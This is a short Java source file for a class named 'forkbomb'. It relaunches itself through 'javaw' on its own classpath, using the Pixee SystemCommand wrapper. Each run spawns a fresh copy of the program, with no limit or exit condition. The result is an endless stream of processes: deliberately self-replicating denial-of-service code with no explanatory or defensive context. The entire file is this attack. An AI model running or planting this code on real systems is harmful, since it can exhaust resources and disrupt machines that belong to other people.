import io.github.pixee.security.SystemCommand;

public class forkbomb
{
	public static void main(String[] args)
	{
		SystemCommand.runCommand(Runtime.getRuntime(), new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "forkbomb"});
	}
}
